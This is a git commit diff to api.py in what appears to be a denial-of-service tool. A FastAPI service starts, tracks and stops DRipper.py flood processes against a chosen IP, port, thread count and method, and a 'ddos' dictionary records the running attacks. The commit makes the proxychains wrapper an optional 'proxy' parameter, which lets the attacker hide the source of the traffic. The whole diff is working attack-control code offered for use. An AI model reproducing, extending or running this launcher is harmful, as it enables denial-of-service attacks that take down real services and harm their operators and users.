0a057465cd2908275da21b3d13699e5a8ff91ad4
himadieievsv <gimadeevsv@gmail.com>
2022-03-08 00:50:24 +0900

    api controlled proxy

--- api.py
+++ api.py
@@ -6,7 +6,6 @@ from datetime import datetime
 import os
 import uvicorn
 
-
 app = FastAPI()
 
 ddos = {}
@@ -14,13 +13,16 @@ ddos = {}
 
 @app.post("/start")
 def start(
-    ip: str, port: int = 80, threads: int = 100, method: str = 'udp', resource: str = '',
+        ip: str, port: int = 80, threads: int = 100, method: str = 'udp', resource: str = '', proxy: str = '',
 ):
-    p = Popen(
-        ['proxychains', 'python3', 'DRipper.py', '-s', ip, '-p', str(port), '-t', str(threads), '-m', method, '--resource', resource],
-        stdout=PIPE,
-    )
-    ddos[p.pid] = {'id': p.pid, 'ip': ip, 'port': port, 'url': resource, 'started': datetime.now()}
+    command_chain = ['python3', 'DRipper.py', '-s', ip, '-p', str(port), '-t', str(threads), '-m', method,
+                     '--resource', resource]
+    if proxy != '':
+        command_chain = [proxy] + command_chain
+    print(command_chain)
+    p = Popen(command_chain, stdout=PIPE)
+    ddos[p.pid] = {'id': p.pid, 'ip': ip, 'port': port, 'threads': threads, 'res': resource, 'proxy': proxy,
+                   'started': datetime.now()}
     return ddos[p.pid]
 
 
@@ -47,6 +49,7 @@ def stop_process(process_id: int):
         del ddos[process_id]
         return p.pid
     return JSONResponse(status_code=404)
+
 
 @app.delete("/clear")
 def stop_all_process():
